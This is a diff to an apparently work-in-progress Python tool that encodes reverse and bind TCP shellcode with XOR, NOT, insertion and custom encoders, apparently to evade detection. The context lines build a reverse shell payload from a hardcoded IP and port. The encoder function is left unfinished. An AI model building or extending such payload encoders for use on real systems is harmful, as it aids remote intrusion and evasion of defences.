@@ -13,6 +13,34 @@
 # handle our imports
 
 import sys
+import argparse
+
+
+
+parser = argparse.ArgumentParser(description='Custom shell script encoder')
+
+shelltype = parser.add_mutually_exclusive_group()
+shelltype.add_argument('-r', '--reverse', help='Reverse TCP shell', action='store', dest='revshell')
+shelltype.add_argument('-b', '--bind', help='Bind TCP shell', action='store', dest='bindshell')
+
+encoder = parser.add_mutually_exclusive_group()
+encoder.add_argument('-x', '--xor', help='XOR Encoder', action='store_true', dest='xorEncoder')
+encoder.add_argument('-n', '--not', help='NOT Encoder', action='store_true', dest='notEncoder')
+encoder.add_argument('-i', '--insert', help='Insertion Encoder', action='store_true', dest='insertEncoder')
+encoder.add_argument('-j', '--jedi', help='Jedi Encoder', action='store_true', dest='jediEncoder')
+encoder.add_argument('-a', '--all', help='XOR, NOT, and Insertion Encoders', action='store_true',  dest='allEncoder')
+
+
+
+
+
+# TCP Bind interactive shell
+# 
+#
+#
+#
+
+
 
 
 # reverse TCP interactive shell
@@ -23,6 +51,10 @@ import sys
 # use iptohex.py
 # to get the shellcode
 # for IP and PORT below
+
+
+
+
 
 ipaddr = "\xc0\xa8\xfa\x81" 
 port = "\x11\x5c"
@@ -40,3 +72,7 @@ shellcode += port
 
 
 
+def encoder(shellcode):
+
+  for i in bytearray(shellcode):
+    
